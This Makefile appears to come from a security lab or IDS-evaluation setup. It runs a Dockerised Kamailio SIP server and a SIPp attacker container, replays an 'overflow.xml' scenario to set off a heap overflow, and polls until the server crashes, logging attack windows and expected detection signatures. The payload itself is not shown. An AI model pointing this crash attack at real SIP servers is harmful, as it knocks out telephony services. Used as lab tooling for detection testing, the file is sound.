DOCKER_COMPOSE := $(shell command -v docker-compose 2> /dev/null || echo "docker compose")
STACK_ID := 3_heap_overflow_kamailio
DRY_RUN_TAG := RTC_DRY_RUN
ATTACK_WINDOW_TAG := RTC_ATTACK_WINDOW
RTC_EVENT ?= :

INSTANCE ?= default
COMPOSE_PROJECT_NAME ?= $(STACK_ID)$(if $(filter default,$(INSTANCE)),,_$(INSTANCE))
COMPOSE := COMPOSE_PROJECT_NAME=$(COMPOSE_PROJECT_NAME) $(DOCKER_COMPOSE)

SERVICE ?= 
INSTANCE_INDEX ?= $(if $(filter default,$(INSTANCE)),0,$(INSTANCE))
NET_PREFIX ?= 10.22.$(INSTANCE_INDEX)
LAB_SUBNET ?= $(NET_PREFIX).0/24
KAMAILIO_IP ?= $(NET_PREFIX).5
SIPP_IP ?= $(NET_PREFIX).10
TARGET_IP ?= $(KAMAILIO_IP)
KAMAILIO_PORT ?= 5060
ATTACK_TIMEOUT_SEC ?= 30
ATTACK_POLL_SEC ?= 1

export LAB_SUBNET KAMAILIO_IP SIPP_IP

run:
	@$(COMPOSE) up -d --remove-orphans

start: run

stop:
	@$(COMPOSE) down --remove-orphans

start-attacks:
	# Previous implementation kept for traceability:
	# @docker exec -it sipp101 bash
	# Change rationale: service-scoped exec targets the selected Compose project instance.
	@$(COMPOSE) exec sipp101 bash

build: 
	@$(COMPOSE) build --no-cache $(SERVICE)
rebuild:
	@$(COMPOSE) down --rmi all --remove-orphans || true
	@$(COMPOSE) build --no-cache $(SERVICE)


dry-run:
	@echo "$(DRY_RUN_TAG)_BEGIN stack=$(STACK_ID)"
	@$(COMPOSE) exec -T sipp101 sh -lc "test -f /sipp/xml/registration101.xml && test -f /sipp/xml/overflow.xml" || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=sipp_assets reason=missing_files"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=sipp_assets"
	@$(COMPOSE) exec -T sipp101 sipp -sf /sipp/xml/registration101.xml "$(TARGET_IP):$(KAMAILIO_PORT)" -m 1 >/tmp/kamailio-dry-run.log 2>&1 || { \
		echo "$(DRY_RUN_TAG)_FAIL stack=$(STACK_ID) check=kamailio_registration reason=sipp_failed"; \
		exit 1; \
	}
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) check=kamailio_registration"
	@echo "$(DRY_RUN_TAG)_OK stack=$(STACK_ID) ready=true"

overflow-attack:
	@IP="$(TARGET_IP)"; \
	if [ -z "$$IP" ]; then \
		CID="$$( $(COMPOSE) ps -q kamailio )"; \
		IP=$$(docker inspect $$CID --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' 2>/dev/null || true); \
	fi; \
	if [ -z "$$IP" ]; then \
		echo "[!] Unable to resolve target IP. Set TARGET_IP explicitly."; \
		exit 1; \
	fi; \
	echo "[*] Launching overflow attack against $$IP:$(KAMAILIO_PORT)..."; \
	$(COMPOSE) exec -T sipp101 sipp -sf /sipp/xml/overflow.xml "$$IP:$(KAMAILIO_PORT)" -m 1

kamailio-status:
	@$(COMPOSE) ps -a kamailio

check-kamailio-running:
	@CID="$$( $(COMPOSE) ps -q kamailio )"; \
	STATUS=$$(docker inspect -f '{{.State.Status}}' $$CID 2>/dev/null || echo "not_found"); \
	if [ "$$STATUS" != "running" ]; then \
		echo "[!] Pre-check failed: kamailio status is '$$STATUS' before attack."; \
		echo "[i] Check with: make kamailio-status"; \
		echo "[i] Last kamailio logs:"; \
		$(COMPOSE) logs --tail 20 kamailio 2>/dev/null || true; \
		exit 1; \
	fi

check-crash:
	@echo "[*] Waiting for kamailio crash (timeout: $(ATTACK_TIMEOUT_SEC)s)..."
	@i=0; \
	limit=$$(( $(ATTACK_TIMEOUT_SEC) / $(ATTACK_POLL_SEC) )); \
	while [ $$i -le $$limit ]; do \
		CID="$$( $(COMPOSE) ps -q kamailio )"; \
		STATUS=$$(docker inspect -f '{{.State.Status}}' $$CID 2>/dev/null || echo "not_found"); \
		if [ "$$STATUS" != "running" ]; then \
			echo "[+] Attack success: kamailio status is '$$STATUS'."; \
			exit 0; \
		fi; \
		sleep $(ATTACK_POLL_SEC); \
		i=$$((i+1)); \
	done; \
	echo "[!] Attack check timed out: kamailio is still running."; \
	exit 1

auto-attack: stop build start
	@$(RTC_EVENT) lab_ready stack=$(STACK_ID) scenario=3 instance=$(INSTANCE) \
		attacker_ip=$(SIPP_IP) victim_ip=$(TARGET_IP) \
		expected_sids=2000003 attack_type=sip_overflow \
		probe_targets=$(SIPP_IP),$(TARGET_IP) probe_protocols=tcp,udp,icmp
	@echo "[*] Waiting for containers (3 seconds)..."
	@sleep 3
	@$(MAKE) check-kamailio-running
	@$(RTC_EVENT) attack_start stack=$(STACK_ID) scenario=3 instance=$(INSTANCE) attack=sip_overflow attacker_ip=$(SIPP_IP) victim_ip=$(TARGET_IP)
	@echo "$(ATTACK_WINDOW_TAG)_BEGIN ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=3 instance=$(INSTANCE) attack=sip_overflow"
	@$(MAKE) overflow-attack TARGET_IP="$(TARGET_IP)" KAMAILIO_PORT="$(KAMAILIO_PORT)"
	@$(MAKE) check-crash ATTACK_TIMEOUT_SEC="$(ATTACK_TIMEOUT_SEC)" ATTACK_POLL_SEC="$(ATTACK_POLL_SEC)"
	@$(RTC_EVENT) attack_end stack=$(STACK_ID) scenario=3 instance=$(INSTANCE) attack=sip_overflow
	@echo "$(ATTACK_WINDOW_TAG)_END ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=3 instance=$(INSTANCE) attack=sip_overflow"
	@$(RTC_EVENT) lab_stop stack=$(STACK_ID) scenario=3 instance=$(INSTANCE)
	@$(MAKE) stop

attack: 
	@$(MAKE) check-kamailio-running
	@echo "$(ATTACK_WINDOW_TAG)_BEGIN ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=3 instance=$(INSTANCE) attack=sip_overflow"
	@$(MAKE) overflow-attack TARGET_IP="$(TARGET_IP)" KAMAILIO_PORT="$(KAMAILIO_PORT)"
	@$(MAKE) check-crash ATTACK_TIMEOUT_SEC="$(ATTACK_TIMEOUT_SEC)" ATTACK_POLL_SEC="$(ATTACK_POLL_SEC)"
	@echo "$(ATTACK_WINDOW_TAG)_END ts_utc=$$(date -u +"%Y-%m-%dT%H:%M:%SZ") stack=$(STACK_ID) scenario=3 instance=$(INSTANCE) attack=sip_overflow"
	@$(MAKE) stop
